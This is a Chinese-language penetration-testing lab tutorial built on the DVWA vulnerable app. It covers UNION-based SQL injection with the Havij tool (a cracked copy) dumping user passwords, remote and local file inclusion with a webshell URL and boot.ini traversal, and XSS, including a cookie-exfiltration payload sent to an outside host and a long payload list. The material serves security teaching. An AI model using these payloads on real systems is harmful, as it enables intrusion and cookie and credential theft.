<p>在SQL语句中，UNION关键字多用来将并列的多组查询结果(表)合并成一个结果(表)，简单实例如下：</p>
<pre><code>SELECT Id,Name,Comment FROM Product1
UNION
SELECT Id,Name,Comment FROM Product2
</code></pre><p><code>这里需要注意的是UNION联合查询前后的两个SELECT语句要对称，即查询的字段数要相同才能正确查询，前面的SELECT查询了ID、Name、Comment这三个字段，UNION后面的SELECT语句也只能查询三个字段，实际测试是需要在UNION后面的语句里不断更换字段数知道正确查询匹配出正确的字段数。</code></p>
<p>以下是尝试匹配字段数的过程：</p>
<p>如下图，UNION后面在查询1个字段时，报错，在查询2个字段时，报错，直到UNION后面查询的字段数到3时可正确查询，说明UNION前面的查询有三个字段。</p>
<p><img src="picture/img (58).png" alt="Alt text"></p>
<p>当访问URL为以下链接时：</p>
<pre><code>http://www.test.test/dwva/injet.php?id=1 union select 1,2,3
</code></pre><p>当前sql查询语句为：</p>
<pre><code>SELECT * FROM admin WHERE id=1 union select 1,2,3
</code></pre><p>此时可以正确返回页面，如下：</p>
<p><img src="picture/img (59).png" alt="Alt text"></p>
<p>此时第二个查询的结果是：1，2，3，在页面上的显示被称为<code>显示位</code>，我们尝试在<code>2</code>的显示位查询mysql根目录，实际语句为：</p>
<pre><code>select @@basedir
</code></pre><p>直接在UNION后面的查询把<code>2</code>替换为<code>@@basedir</code>,理想效果是在访问之后，原先<code>2</code>的位置返回了mysql根目录。</p>
<p>实际执行的sql语句为：</p>
<pre><code>SELECT * FROM admin WHERE id=1 union select 1,@@basedir,3
</code></pre><p>于是得到当前mysql根目录为：</p>
<pre><code>C:/Program Files/phpStudy/MySQL/
</code></pre><p>如下图：</p>
<p><img src="picture/img (60).png" alt="Alt text"></p>
<p>我们尝试在<code>1</code>的显示位查询当前数据库用户，实际语句为：</p>
<pre><code>select user()
</code></pre><p>直接在UNION后面的查询把<code>1</code>替换为<code>user()</code>,理想效果是在访问之后，原先1的位置返回了当前数据库用户。</p>
<p>实际执行的sql语句为：</p>
<pre><code>SELECT * FROM admin WHERE id=1 union select 1,user(),3
</code></pre><p>于是得到当前数据库用户为：</p>
<pre><code>root@localhost
</code></pre><p>如下图：</p>
<p><img src="picture/img (61).png" alt="Alt text"></p>
<p>如此，我们已经可以手工在注入点通过利用sql注入漏洞查询到一些敏感的数据库信息。</p>
<h4 id="-3-sql-">步骤3：利用工具进行sql注入攻击</h4>
<blockquote>
<p> 本步骤将使用Havij（胡萝卜）对目标注入点进行扫描</p>
</blockquote>
<p>点击桌面上的<code>tools</code>目录进入工具目录</p>
<p><strong>安装方法：</strong>
解压<code>havij.rar</code>运行<code>注册控件.exe</code>，然后执行<code>Havij 1.15 Pro CracKed By Hmily[LCG].exe</code>即可
如果提示以下错误： 
<code>部件 "tabctl32.ocx" 或其附件之一不能正确注册：一个文件丢失或无效</code>
只要执行一下”注册.bat“即可</p>
<blockquote>
<p>如果出现工具不能使用，请删除已解压的目录，重新解压<code>havij.rar</code>运行<code>注册控件.exe</code>，然后执行<code>Havij 1.15 Pro CracKed By Hmily[LCG].exe</code>即可</p>
</blockquote>
<p><img src="picture/img (62).png" alt="Alt text"></p>
<p>首先我们打开<code>Havij 1.15 Pro CracKed By Hmily[LCG].exe</code>：虽然语言为英文，相关参数的填写看起来还比较直观：</p>
<p><img src="picture/img (62).png" alt="Alt text"></p>
<p>只需将刚才发现的注入点地址，填写进最上面的<code>Target</code>URL地址栏里，点击<code>Analyze</code>，工具就可以开始自动注入了。
稍等一旦注入完毕，点击<code>Info</code>一栏可以查看到注入点的相关具体信息：</p>
<p><img src="picture/img (63).png" alt="Alt text"></p>
<p>具体信息如下：</p>
<pre><code>Target:   http://www.test.test/dwva/injet.php?id=1    //目标地址
Host IP:  10.211.55.6       //主机ip
Web Server:  Apache/2.4.10 (Win32)  //web服务容器 
Powered-by:  PHP/5.3.29  //PHP版本
DB Server:  MySQL &gt;=5       //数据库版本
Current DB:  sqlinject   //当前数据库
Data Bases:              //列举出了所有数据库
        information_schema  
  dvwa
  mysql
  performance_schema
  sqlinject
  test
  wackopicko
  wordpress
  wp
</code></pre><p>我们切换到<code>Tables</code>一栏，点击<code>Get DBs</code>来列取数据库：</p>
<p><img src="picture/img (64).png" alt="Alt text"></p>
<p>如上图，程序很快就列出了所有数据库：</p>
<pre><code>information_schema  
dvwa
mysql
performance_schema
sqlinject
test
wackopicko
wordpress
wp
</code></pre><p>接着我们尝试读取某个数据库里面的表结构，例如：<code>dwva</code>这个数据库,选该数据库，点击<code>Get Tables</code>:</p>
<p><img src="picture/img (65).png" alt="Alt text"></p>
<p>由上图可知，程序很快列举出<code>dwva</code>这个数据库中存在如下几个表：</p>
<pre><code>guestbook
users
</code></pre><p>这时候已经注入到了<code>users</code>表，根据经验判断，我们选择<code>users</code>表，并获取其中数据，勾选<code>users</code>表后，点击<code>Get Columns</code>获取列，这样就可以直接获取到<code>users</code>表下列的内容了:</p>
<p><img src="picture/img (66).png" alt="Alt text"></p>
<p>如上图，现在已经获取到了<code>users</code>表中的 <code>user_id</code>、<code>first_name</code>、<code>user</code>、<code>password</code>。。。等列，根据之前的经验判断，<code>user</code>、<code>password</code>列中很可能存放着账号和密码，现在选择<code>user</code>、<code>password</code>，然后点击右侧的<code>Get Data</code>获取数据：</p>
<p><img src="picture/img (67).png" alt="Alt text"></p>
<p>如上图，点击<code>Get Data</code>获取数据后，就可以成功得到到<code>user</code>、<code>password</code>列中的数据。</p>
<p>然后我们选择<code>Save Tables</code>把结果导出到桌面<code>1111.html</code>，然后我们打开<code>1111.html</code>，可以更直观的查看到注入攻击的结果，如下图：</p>
<p><img src="picture/img (68).png" alt="Alt text"></p>
<p>扫描报告结果如下，可以很直观的帮助我们理解和查看数据库相关信息：</p>
<pre><code>Target: http://www.test.test/dwva/injet.php?id=%Inject_Here%1 
Date: 2016-11-27 22:32:57    //目标地址
DB Detection: MySQL error based (Auto Detected)  //注入类型
Method: GET   //提交方式
Type: Integer (Auto Detected) //参数类型
Data Base: dvwa   //当前查询的数据库
Table: users   //当前表
Total Rows: 5  //表中列行数

user password 

。。。。。
</code></pre><h3 id="-">实验结果分析与总结</h3>
<p>工具注入的确比手工注入要方便的多，但工具使用起来不灵活，因此使用工具注入需要掌握手工注入的原理和方法，工具和手工配合，才能发挥出最佳的效果</p>
<h3 id="-">思考</h3>
<p>1.手工注入和工具注入有什么区别，他们的优缺点分别是什么？</p>
<p>2.如果在工具注入中遇到有WAF的网站该怎么办，想一想有什么办法和思路？</p>
</div>

### 文件包含漏洞的发现与利用  

<div id="sectionDoc" class="markdown-body czsc_con smallTxt "><h3 id="-">实验目的</h3>
<p>通过本实验，学习发现和利用文件包含漏洞。</p>
<h3 id="-">实验工具</h3>
<blockquote>
<ul>
<li><strong>DVWA </strong>:&gt;   DVWA (Dam Vulnerable Web Application)DVWA是用PHP+Mysql编写的一套用于常规WEB漏洞教学和检测的WEB脆弱性测试程序。包含了SQL注入、XSS、盲注等常见的一些安全漏洞。</li>
</ul>
</blockquote>
<h3 id="-">实验内容</h3>
<blockquote>
<p>本部分学习发现和利用文件包含漏洞</p>
</blockquote>
<p><strong>什么是文件包含漏洞？</strong></p>
<blockquote>
<p>简单的来说，就是我们用一个可控的变量作为文件名并以文件包含的的方式调用了它，漏洞就产生了。以PHP为例文件包含漏洞可以分为RFI(远程文件包含)和LFI（本地文件包含漏洞）两种。而区分他们最简单的方法就是php.ini中是否开启了allow_url_include。如果开启了我们就有可能包含远程文件，如果不是我们有可能包含本地的文件。</p>
</blockquote>
<ul>
<li><strong>本部分概览</strong><ul>
<li>初步了解文件包含漏洞</li>
<li>远程文件包含</li>
<li>本地文件包含</li>
</ul>
</li>
</ul>
<h3 id="-">实验步骤</h3>
<h4 id="-1-">步骤1 初步了解文件包含漏洞</h4>
<ul>
<li><strong>什么是文件包含漏洞</strong></li>
</ul>
<p>文件包含，包括本地文件包含（Locao file inclusion,LFI)和远程文件包含（Remote File Inclusion,RFI)两种形式。</p>
<p>首先，本地文件包含就是通过浏览器引进（包含）Web服务器上的文件，这种漏洞一般发生在浏览器包含文件时没有进行严格的过滤，允许遍历目录的字符注入浏览器并执行比如：</p>
<pre><code>asp?file=index.html
</code></pre><p>其次，远程文件简称RFI，该漏洞允许攻击者包含一个远程的文件，一般是远程服务器上的预先设置好的脚本，这种漏洞是由于浏览器对于用户输入没有进行检测，导致不同程度的信息泄露、拒绝服务攻击甚至在目标服务器上执行代码（比如：</p>
<pre><code>asp?file=http://www.hacker.com/webshell/shell.asp)
</code></pre><ul>
<li><strong>为什么要包含文件？</strong></li>
</ul>
<p>程序员写程序的时候，不喜欢干同样的事情，也不喜欢把同样的代码（比如一些公用的函数）写几次，于是就把需要公用的代码写在一个单独的文件里面，比如<code>share.php</code>，而后在其它文件进行包含调用。在php里，我们就是使用上面列举的那几个函数来达到这个目的的，它的工作流程：如果你想在 <code>main.php</code>里包含<code>share.php</code>,我将这样写<code>include("share.php")</code>就达到目的，然后就可以使用<code>share.php</code>中的函数了，像这个写死需要包含的文件名称的自然没有什么问题，也不会出现漏洞，那么问题到底是出在哪里呢？
有的时候可能不能确定需要包含哪个文件，比如先来看下面这个文件<code>index.php</code>的代码：</p>
<pre><code>if ($_GET[page]) {
include $_GET[page];
} else {
include "home.php";
}
</code></pre><p>很正常的一段PHP代码，它是怎么运作的呢？
上面这段代码的使用格式可能是这样的：</p>
<pre><code>http://www.test.com/php/index.php?page=main.php
</code></pre><p>或者</p>
<pre><code>http://www.test.com/php/index.php?page=downloads.php
</code></pre><p>结合上面代码，简单说下怎么运作的：</p>
<ol>
<li><p>提交上面这个URL，在index.php中就取得这个page的值<code>（$_GET[page]）</code>。</p>
</li>
<li><p>判断<code>$_GET[page]</code>是不是空，若不空（这里是main.php）就用include来包含这个文件。</p>
</li>
<li><p>若<code>$_GET[page]</code>空的话就执行else，来 <code>include "home.php"</code>　这个文件。</p>
</li>
</ol>
<p>这里其实看上面代码就理解了。</p>
<ul>
<li><strong>为什么会产生漏洞？</strong></li>
</ul>
<p>你也许要说，这样很好呀，可以按照URL来动态包含文件，多么方便呀，怎么产生漏洞的呢？问题的答案是：我们不乖巧，我们总喜欢和别人不一样，我们不会按照他的链接来操作，我们可能想自己写想包含（调用）的文件，比如我们会随便的打入下面这个URL：</p>
<pre><code>http://www.test.test/php/index.php?page=hello.php
</code></pre><p>然后我们的index.php程序就傻傻按照上面我们说得步骤去执行：取page为hello.php，然后去<code>include(hello.php)</code>，这时问题出现了，因为我们并没有hello.php这个文件，所以它 include的时候就会报警告，类似下列信息：</p>
<pre><code>Warning: include(hello.php) [function.include]: failed to open stream: No such file or directory in /vhost/wwwroot/php/index.php on line 3
Warning: include() [function.include]: Failed opening hello.php for inclusion (include_path=.:) in /vhost/wwwroot/php/index.php on line 3
</code></pre><p>注意上面的那个Warning就是找不到我们指定的hello.php文件，也就是包含不到我们指定路径的文件；而后面的警告是因为前面没有找到指定文件，所以包含的时候就出警告了。</p>
<h4 id="-2-">步骤2 远程文件包含</h4>
<blockquote>
<p>本步骤尝试发现和利用远程文件包含漏洞</p>
</blockquote>
<ul>
<li><strong>什么才是"远程文件包含漏洞"？</strong>
回答是：服务器通过php的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到邪恶的目的。</li>
</ul>
<p>涉及到的危险函数：<code>include()</code>,<code>require()</code>和<code>include_once()</code>,<code>require_once()</code></p>
<blockquote>
<p><code>Include</code>:包含并运行指定文件，当包含外部文件发生错误时，系统给出警告，但整个php文件继续执行。</p>
<p><code>Require</code>:跟include唯一不同的是，当产生错误时候，include下面继续运行而require停止运行了。</p>
<p><code>Include_once</code>:这个函数跟include函数作用几乎相同，只是他在导入函数之前先检测下该文件是否被导入。如果已经执行一遍那么就不重复执行了。</p>
<p><code>Require_once</code>:这个函数跟require的区别 跟上面我所讲的include和include_once是一样的。所以我就不重复了。</p>
<p><code>php.ini配置文件</code>：allow_url_fopen=off 即不可以包含远程文件。Php4存在远程&amp;本地，php5仅存在本地包含。</p>
</blockquote>
<p>我们来实际看下，来到我们搭建好的DVWA漏洞演练平台，在火狐浏览器访问以下链接：</p>
<pre><code>http://www.test.test/dwva/
</code></pre><p>该平台登陆用户为<code>admin</code>密码为<code>password</code>,如图打开平台地址输入账号密码登陆：</p>
<p><img src="picture/img (69).png" alt="Alt text"></p>
<p>接着点击左侧<code>DVWA Security</code>按钮，进入选项，选择下拉选项的<code>low</code>，如此把平台安全等级设置为低，方便我们测试。</p>
<p>我们说过，这种漏洞一般发生在浏览器包含文件时没有进行严格的过滤，允许遍历目录的字符注入浏览器并执行比如：</p>
<pre><code>asp?file=index.html
</code></pre><p>那么我们来到DVWA的文件包含漏洞模块，点击左边的<code>File Inclusion</code>，进入文件包含漏洞模块，看到URL如下：</p>
<pre><code>http://www.test.test/dwva/vulnerabilities/fi/?page=include.php
</code></pre><p><img src="picture/img (71).png" alt="Alt text"></p>
<p>这看起来很像文件包含漏洞的URL类型，参数为文件。</p>
<ul>
<li><strong>如何利用？</strong></li>
</ul>
<p>上面可以看到，问题出现了，那么我们怎么利用这样的漏洞呢，利用方法其实很多，但是实质上都是差不多的，我这里说三个比较常见的利用方法：</p>
<ul>
<li>远程文件包含可运行的PHP木马</li>
</ul>
<p>如果目标主机的<code>allow_url_fopen</code>是激活的（默认是激活的，没几个人会修改），我们就可以有更大的利用空间，我们可以指定其它URL上的一个包含PHP代码的webshell来直接运行，比如，我先写一个查看web环境的PHP代码，如下保存为<code>phpinfo.txt</code>（后缀不重要，只要内容为PHP格式就可以了）。</p>
<pre><code>＜?php
 phpinfo(); 
?&gt;
</code></pre><p>以上这个文件的作用就是查看web环境具体信息。把这个文件保存到我们主机的服务器上（可以是不支持PHP的主机），只要能通过HTTP访问到就可以了，(我们环境中不支持访问互联网，于是就用本机的web环境)例如地址如下：</p>
<pre><code>http://www.test.test/phpinfo.txt
</code></pre><p>然后我们就可以构造如下URL来利用漏洞了：</p>
<pre><code>http://www.test.test/dwva/vulnerabilities/fi/?page=http://www.test.tets/phpinfo.txt
</code></pre><p><img src="picture/img (72).png" alt="Alt text"></p>
<p>这里包含了远程文件<code>http://www.test.tets/phpinfo.txt</code>，如上图，可以看到，远程文件里的代码被成功执行。</p>
<p>如此，同理包含一个远程的webshell(脚本木马)，我想这里不用赘述。</p>
<p>也许有的人认为还是得到目标机上的一个真实的Webshell比较放心，万一哪天人家发现这儿个包含漏洞修补了，我们就不能再远程包含得到上面的那个" 伪"Webshell了，不是么？可以理解这个心态，我们继续，可以利用包含的脚本木马上传一个webshell到服务器。关于脚本木马的使用我们会在下面的课程介绍。</p>
<h4 id="-2-">步骤2 本地文件包含</h4>
<blockquote>
<p>利用方式与远程文件包含类似，这里的利用方式在满足远程文件包含漏洞的情况下都可以被利用。</p>
</blockquote>
<ul>
<li><p><strong>如何利用？</strong></p>
</li>
<li><p>包含读出目标机上其它文件</p>
</li>
</ul>
<p>由前面我们可以看到，由于对取得的参数<code>page</code>没有过滤，于是我们可以任意指定目标主机上的其它敏感文件，，那么我们就可以多次探测来包含其它文件。
比如读取数据库文件等，举个例子，该目录存在一个文件为<code>data.mdb</code>，我们尝试读取该文件内容：</p>
<p>可以指定URL为：</p>
<pre><code>http://www.test.test/dwva/vulnerabilities/fi/?page=data.mdb
</code></pre><p>或者是这样：</p>
<pre><code>http://www.test.test/dwva/vulnerabilities/fi/?page=./data.mdb
</code></pre><p>我们来实际测试看一下：</p>
<p><img src="picture/img (73).png" alt="Alt text"></p>
<p><img src="picture/img (74).png" alt="Alt text"></p>
<p>可以看到页面上显示了文件内容，或许不完整，但是我们还是读取到了一些敏感信息。这看起来很像mysql数据库配置文件。</p>
<p>我来解释下：
可以读出当前路径下的文件，也可以使用<code>../../</code>进行目录跳转（在没过滤<code>../</code>的情况下）；比如我们看下如下URL：</p>
<pre><code>http://www.test.test/dwva/vulnerabilities/fi/?page=./../../../phpinfo.txt
</code></pre><p>这里尝试往上跳3级目录即根目录，读取根目录<code>phpinfo.txt</code>，文件内容为：</p>
<pre><code>＜?php
 phpinfo(); 
?&gt;
</code></pre><p>实际测试如图：</p>
<p><img src="picture/img (75).png" alt="Alt text"></p>
<p>这里并没有读取文件内容，而是执行了文件中的php代码，于是我们得知：若文件内容为php代码，将会被执行。</p>
<p>也可以直接指定绝对路径，读取敏感的系统文件，比如这个URL：</p>
<pre><code>http://www.test.test/dwva/vulnerabilities/fi/?page=c:oot.ini
</code></pre><p>如果目标主机没有对权限限制的很严格，或者启动Apache的权限比较高，是可以读出这个文件内容的。否则就会得到一个类似于：<code>open_basedir restriction in effect.</code>的Warning信息。</p>
<p><img src="picture/img (76).png" alt="Alt text"></p>
<p>可以看到，目标机的<code>c:oot.ini</code>文件内容已经显示在页面中。</p>
<p>这类漏洞看起来貌似并不严重，一旦被恶意利用则会带来很大的危害。本地文件包含不仅能够包含web文件目录中的一些配置文件（比如Web应用、数据库配置文件、config文件），还可以查看到一些Web动态页面的源代码，为攻击者进一步发掘web应用漏洞提供条件，甚至一旦与路径遍历漏洞相结合，还可能直接攫取目标系统的用户名与密码等文件。</p>
<p>这里的本地文件包含漏洞，黑客通常是通过上传功能(如用户上传头像)传一个txt或者图片等允许上传类型的文件，文件内容为恶意脚本，然后通过本地文件包含漏洞包含这个文件，获得shell。</p>
<h3 id="-">实验结果分析与总结</h3>
<p>本部分简单学习了远程文件包含漏洞和本地文件包含漏洞的简单发掘和利用，了解了文件包含漏洞产生的原理和基本利用方式。</p>
<p>需要注意的是，有时候文件包含漏洞其实可以在渗透中发挥巨大作用，直接包含远程shell、包含本地上传的文件、读取敏感文件都是一些常用的姿势。当然还有更多的好姿势。将在以后的实验里慢慢介绍。</p>
<h3 id="-">思考</h3>
<ol>
<li><p>如果该网站不存在文件上传等功能，并且存在远程文件包含漏洞，你知道如何利用该漏洞取得目标机权限吗？</p>
</li>
<li><p>如果该网站不存在文件上传等功能，并且不存在远程文件包含漏洞，只存在本地文件包含漏洞，你能想到什么方法向服务器写入恶意代码并包含它？</p>
</li>
</ol>
</div>

### XSS漏洞的发现与利用  

<div id="sectionDoc" class="markdown-body czsc_con smallTxt "><h3 id="-">实验目的</h3>
<p>通过本实验，初步了解XSS漏洞，学习反射型xss漏洞的发现与利用，存储型xss漏洞的发现与利用。</p>
<h3 id="-">实验工具</h3>
<blockquote>
<ul>
<li><strong>DVWA </strong>:&gt;   DVWA (Dam Vulnerable Web Application)DVWA是用PHP+Mysql编写的一套用于常规WEB漏洞教学和检测的WEB脆弱性测试程序。包含了SQL注入、XSS、盲注等常见的一些安全漏洞。</li>
</ul>
</blockquote>
<h3 id="-">实验内容</h3>
<blockquote>
<p>本部分学习发现和利用xss漏洞</p>
</blockquote>
<ul>
<li><strong>本部分概览</strong><ul>
<li>初步了解XSS漏洞</li>
<li>反射型xss漏洞的发现与利用</li>
<li>存储型xss漏洞的发现与利用</li>
</ul>
</li>
</ul>
<blockquote>
<p>XSS又叫CSS (Cross Site Script) ，跨站脚本攻击。它指的是恶意攻击者往Web页面里插入恶意脚本代码，而程序对于用户输入内容未过滤，当用户浏览该页之时，嵌入其中Web里面的脚本代码会被执行，从而达到恶意攻击用户的特殊目的。</p>
<p>跨站脚本攻击的危害：窃取cookie、放蠕虫、网站钓鱼 ...</p>
<p>跨站脚本攻击的分类主要有：存储型XSS、反射型XSS（深入了解还有DOM型XSS，待我们深入了解之后再去分析）</p>
<p>XSS漏洞是Web应用程序中最常见的漏洞之一。如果您的站点没有预防XSS漏洞的固定方法，那么就存在XSS漏洞。这个利用XSS漏洞的病毒之所以具有重要意义是因为，通常难以看到XSS漏洞的威胁，而该病毒则将其发挥得淋漓尽致。</p>
</blockquote>
<h3 id="-">实验步骤</h3>
<h4 id="-1-xss-">步骤1 初步了解XSS漏洞</h4>
<ul>
<li><strong>XSS工作流程</strong></li>
</ul>
<ol>
<li>恶意用户，在一些公共区域（例如，建议提交表单或消息公共板的输入表单）输入一些文本，这些文本被其它用户看到，但这些文本不仅仅是他们要输入的文本，同时还包括一些可以在客户端执行的脚本。如：<code>http://xxx.xxx.com.cn/intf/_photos.jsp?callback=＜script＞[removed].href="http://www.baidu.com?a=" + escape(document．cookie)＜/script＞</code>,参数<code>＜script＞xxx＜/script＞</code>如果这里没有经过转义处理，则页面中就嵌入了一段script</li>
<li>恶意提交这个表单</li>
<li>其他用户看到这个包括恶意脚本的页面并执行，获取用户的cookie等敏感信息。</li>
</ol>
<p>来一张图，具体理解以下跨站脚本工具的原理流程：</p>
<p><img src="../../resources/files/picture/1cc56d225af14037/1480332001035.png" alt="Alt text"></p>
<ul>
<li>反射型XSS和存储型XSS对比</li>
</ul>
<p>存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie等。如：人人网又一大波蠕虫，位置在首页+登录就中招+通杀网页和人人桌面</p>
<p>反射型XSS，非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。</p>
<p>余弦的书说的很明白，最大的区别就是xss代码是否存储在服务器中。
反射最典型的例子就是给个链接让你点击。
存储最典型的例子就是留言板啊。</p>
<h4 id="-2-xss-">步骤2 反射型xss漏洞的发现与利用</h4>
<ul>
<li>0X00 了解URL组成</li>
</ul>
<p>URL 的一种常见组成模式如下：</p>
<pre><code>&lt;scheme&gt;://&lt;netloc&gt;/&lt;path&gt;?&lt;query&gt;#&lt;fragment&gt;
</code></pre><p>比如，一个最普通的URL 如下：</p>
<p><code>http://www.foo.com/path/f.PHP?id=1&amp;type=cool#new</code></p>
<p>对应关系如下：</p>
<pre><code>&lt;scheme&gt; - http
&lt;netloc&gt; - www.foo.com  //地址
&lt;path&gt; - /path/f.php
&lt;query&gt; -id=1&amp;type=cool，包括&lt;参数名=参数值&gt;
&lt;fragment&gt; - new
</code></pre><p>对这个URL 来说，攻击者可控的输入点有<code>&lt;path&gt;</code>、<code>&lt;query&gt;</code>、<code>&lt;fragment&gt;</code>三个部分。这三部分对攻击者（或挖掘工具）来说，其意义非常明确。
那么看下面这个URL：</p>
<pre><code>http://www.foo.com/path/1/id#new
</code></pre><p>攻击者可以知道是/path 还是<code>&lt;path&gt;</code>，<code>1</code> 是参数值，<code>id</code>是参数名.</p>
<ul>
<li>0x01 了解可控点</li>
</ul>
<p>攻击者可控的输入点有<code>&lt;path&gt;</code>、<code>&lt;query&gt;</code>、<code>&lt;fragment&gt;</code>三个，其实<code>&lt;fragment&gt;</code>里的值一般不会出现在服务端解析，除非Web 2.0 网站，比如twitter，
它的URL 格式如下：</p>
<pre><code>http://twitter.com/evilcos!#status
</code></pre><p>请求时，第一步会通过JavaScript 的location.href 获取到完整的URL，并解析出status值，然后通过各种AJAX 函数来处理请求，最后进行各种局部页面的异步刷新。用户体验很好，可是爬虫很抓狂。同样，对这部分的反射型XSS 挖掘就困难了很多，我们先从简单
的入手，这个<code>&lt;fragment&gt;</code>暂时跳过。</p>
<ul>
<li>0x02 XSS测试语句</li>
</ul>
<p>由于<code>&lt;path&gt;</code>和<code>&lt;query&gt;</code>的情况很相似，所以，下面以流行的<code>&lt;query&gt;</code>为例进行说明。
看下面一个普通的URL：</p>
<pre><code>http://www.foo.com/xss.php?id=1
</code></pre><p>攻击者会这样进行XSS 测试，将如下payloads 分别添加到id=1：</p>
<pre><code>＜script＞alert（1）＜/script＞

""&gt;＜script＞alert（1）＜/script＞
</code></pre><p><code>＜script＞alert（1）＜/script＞</code>是一个最基本的JS语句，起到弹窗测试的作用。</p>
<p>即如果存在XSS漏洞，将会弹窗。</p>
<p>我们来实际测试下，来到我们搭建好的DVWA漏洞演练平台，在火狐浏览器访问以下链接：</p>
<pre><code>http://www.test.test/dwva/
</code></pre><p>该平台登陆用户为<code>admin</code>密码为<code>password</code>,如图打开平台地址输入账号密码登陆：</p>
<p><img src="picture/img (69).png" alt="Alt text"></p>
<p>接着点击左侧<code>DVWA Security</code>按钮，进入选项，选择下拉选项的<code>low</code>，如此把平台安全等级设置为低，方便我们测试。如下图：</p>
<p><img src="picture/img (70).png" alt="Alt text"></p>
<p>点击左侧的<code>XSS(Reflected)</code>进入反射型XSS漏洞测试模块：</p>
<p><img src="picture/img (77).png" alt="Alt text"></p>
<p>这里给了个输入框，我们尝试随意输入内容<code>hack</code>，点击提交后我们发现页面出现欢迎信息<code>hello hack</code>，然后我们利用火狐的hackbar插件载入当前URL，看到我们提交的<code>hack</code>在URL体现,变量名为<code>name</code>。</p>
<p><img src="picture/img (78).png" alt="Alt text"></p>
<p>于是我们思考，<code>name</code>变量是由我们输入，即该变量为用户可控，如果这里在后端没有做特殊的过滤，就很有可能造成了XSS漏洞。</p>
<p>我们根据第一步的测试方法：</p>
<p>攻击者会这样进行XSS 测试，将如下payloads 分别添加到可控的变量：</p>
<pre><code>＜script＞alert（1）＜/script＞

""&gt;＜script＞alert（1）＜/script＞
</code></pre><p>我们尝试提交<code>＜script＞alert（1）＜/script＞</code>,如下图，可以看到成功弹窗：</p>
<p><img src="picture/img (79).png" alt="Alt text"></p>
<p>然后我们载入当前URL，看到我们提交的变量确实被带入了。</p>
<p>可以看到此前URL为：</p>
<pre><code>http://www.test.test/dwva/vulnerabilities/xss_r/?name=＜script＞alert（1）＜/script＞#
</code></pre><p><img src="picture/img (80).png" alt="Alt text"></p>
<p>我们右键查看源代码可以看见，我们提交的Javascript代码<code>＜script＞alert（1）＜/script＞</code>在页面的html中并没有被过滤，可以正常执行，这就是最经典的反射型XSS漏洞：</p>
<p><img src="picture/img (81).png" alt="Alt text"></p>
<p>那么，你会想，光弹个窗就是漏洞了？
哈哈，当然不是，这里可以参照sql注入漏洞来理解，弹个窗说明我们可以执行自定义代码了，那么之后，可以做的事可就多了，比如，读取cookies。</p>
<p>先来学习下面测试代码弹出cookies：</p>
<pre><code>"&gt;＜script＞alert（document．cookie）＜/script＞
="&gt;＜script＞alert（document．cookie）＜/script＞
＜script＞alert（document．cookie）＜/script＞
</code></pre><p>我们来尝试提交<code>＜script＞alert（document．cookie）＜/script＞</code>，可以看到此时如我们料想弹出了当前用户的cookies：</p>
<p><img src="picture/img (82).png" alt="Alt text"></p>
<p>载入当前URL可以看到当前URL为：</p>
<pre><code>http://www.test.test/dwva/vulnerabilities/xss_r/?name=＜script＞alert（document．cookie）＜/script＞#
</code></pre><p>cookies其实是用户的某种意义上的令牌，cookies泄露的危害我就不赘述了，那么其实黑客在利用的时候可以构造语句读取cookies发送到远程服务器以被黑客获取，并且悄无声息，不弹窗，隐蔽性极高。</p>
<p>利用方式一般是，通过社会工程学等猥琐姿势，诱导管理员点击我们构造好的URL，触发恶意代码。</p>
<h4 id="-3-xss-">步骤3 存储型xss漏洞的发现与利用</h4>
<p>如果程序员在开发应用时，没有假设“任何用户的输入都是不合法的”，那么漏洞很有可能就产生了。</p>
<p>存储型xss漏洞可以出现在社区发言、留言板、用户信息更改等等页面，总而言之，存在用户输入的地方就可能存在存储型xss漏洞。</p>
<p>于是我们研究出了一个简单粗暴地漏洞验证方法：<code>XSS盲打</code>。</p>
<blockquote>
<p>所谓<code>盲打</code>，就是在用户输入的地方，以尽可能多的方式在尽可能多的输入点测试XSS代码。</p>
</blockquote>
<p>下面给出一些常用的XSS测试方式代码：</p>
<pre><code>"&gt;＜script＞alert（document．cookie）＜/script＞
="&gt;＜script＞alert（document．cookie）＜/script＞
＜script＞alert（document．cookie）＜/script＞
＜script＞alert（vulnerable）＜/script＞
＜script＞alert（"XSS"）＜/script＞
＜script＞alert（"XSS"）＜/script＞
＜ BACKGROUND="[removed]alert（"XSS"）"&gt;
&lt;BODY ONLOAD=alert（"XSS"）&gt;
&lt;BGSOUND src="[removed]alert（"XSS"）;"&gt;
&lt;br size="&amp;{alert（"XSS"）}"&gt;
&lt;LAYER src="http://xss.ha.ckers.org/a.js"&gt;&lt;/layer&gt;
&lt;LINK REL="stylesheet" href="[removed]alert（"XSS"）;"&gt;
&lt;IMG src="[removed]msgbox("XSS")"&gt;
&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=[removed]alert（"XSS"）;"&gt;
&lt;IFRAME src=[removed]alert（"XSS"）&gt;&lt;/IFRAME&gt;
&lt;FRAMESET&gt;&lt;FRAME src=[removed]alert（"XSS"）&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;
&lt;TABLE BACKGROUND="[removed]alert（"XSS"）"&gt;
&lt;STYLE&gt;@import"javasc
ipt:alert（"XSS"）";&lt;/STYLE&gt;
&lt; TYPE&gt;.XSS{background-image:url("[removed]alert（"XSS"）");}&lt;/STYLE&gt;&lt;A class="XSS"&gt;&lt;/A&gt;
&lt;STYLE type="text/css"&gt;BODY{background:url("[removed]alert（"XSS"）")}&lt;/STYLE&gt;
&lt;BASE href="[removed]alert（"XSS"）;//"&gt;
getURL("[removed]alert（"XSS"）")
a="get";b="URL";c="[removed]";d="alert（"XSS"）;";eval（a+b+c+d）;
&lt;XML src="[removed]alert（"XSS"）;"&gt;
"&gt; &lt;BODY ONLOAD="a();"&gt;＜SCRIPT＞function a(){alert（"XSS"）;}＜/SCRIPT＞&lt;"
</code></pre><p>我们在DVWA的漏洞测试平台来演练存储型XSS漏洞，先按照前面的方法登陆DVWA，再点击左侧的<code>XSS(Stored)</code>进入存储型XSS漏洞测试模块：</p>
<p><img src="picture/img (83).png" alt="Alt text"></p>
<p>这时候，我们看到，这里是个留言板，于是我们来尝试“盲打”：</p>
<p>尝试提交以下XSS测试代码：</p>
